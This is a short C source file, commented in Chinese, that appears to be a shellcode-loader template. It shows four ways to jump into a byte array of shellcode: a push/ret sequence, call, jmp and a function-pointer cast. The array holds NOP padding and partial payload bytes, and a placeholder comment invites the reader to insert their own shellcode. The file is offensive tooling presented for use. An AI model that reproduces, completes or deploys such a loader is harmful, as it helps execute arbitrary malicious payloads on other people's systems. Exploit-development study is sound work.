#include <stdio.h>
#include <string.h>
#include <tchar.h>

unsigned char shellcode[] =

"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b"

"\x……" // 放上你自己的shellcode

"\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c"

"\x90\x90\x90\x90\x90\x90\x90\x90";


int main()
{


	int nMethod = 4;

	switch (nMethod)
	{
	case 1:
	{
		// 1、方法一，使用push ret指令序列
		__asm
		{
			lea eax, shellcode
			push eax                         // ShellCode地址入栈
			ret                                   // 这里会直接返回到shellcode去执行
		}
	}
	break;
	case 2:
	{
		// 2、方法二，直接使用call指令
		__asm
		{
			lea eax, shellcode
			call eax                                 // 直接去call这个地址
		}
	}
	break;
	case 3:
	{
		// 3、方法三，强制转换为一个函数指针再调用
		((void(*)(void)) &shellcode)();
	}
	break;
	case 4:
	{
		// 4、方法四，使用jmp指令
		__asm
		{
			lea eax, shellcode
			jmp eax
		}
	}
	break;
	default:
		break;
	}

	return 0;

}